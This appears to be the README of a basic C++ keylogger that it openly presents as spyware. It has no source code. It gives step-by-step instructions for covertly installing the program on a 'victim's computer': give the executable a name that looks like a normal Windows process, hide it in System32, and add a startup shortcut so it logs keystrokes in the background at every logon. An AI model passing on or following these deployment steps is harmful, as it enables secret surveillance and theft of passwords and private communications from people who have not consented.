#### This Is A Basic C++ KeyLogger That Can Be Used For Spyware. To Get Started You Will Need To Compile Logger.cpp Into Logger.exe (Hint For Noobs: Don't Just Change The File Extension). After You Have Compiled It You Can Change The File Name To Anything you Want As Long As It Has The Extension '.exe' So that it Seems Like A Normal Windows Function. Now You an Put The Executable Into A Folder On Your Victim's Computer(I Would Put It Into System32 Somewhere). To Make It Start Automatically After Avery Sign In / Startup Open Up The Startup Folder By Hitting Windows+R And Then Typing In shell:startup And Then Hitting Enter. Now Make A Shortcut To the Logger And Put It Into The Startup Folder(If It Isn't A Shortcut Then Log.txt Will Open On Startup As Well Since The Log Is Saved Into The Same Folder As The Logger). Now Every Time A User On That PC Logs On To His/Her Account The Logger Will Automatically Open In The Background And Start Logging Their Keys. Now To Acess The Log You Need To Find The Folder That You Saved The Logger Into And Open 'Log.txt'. This Will Show All The Keys That They Pressed.
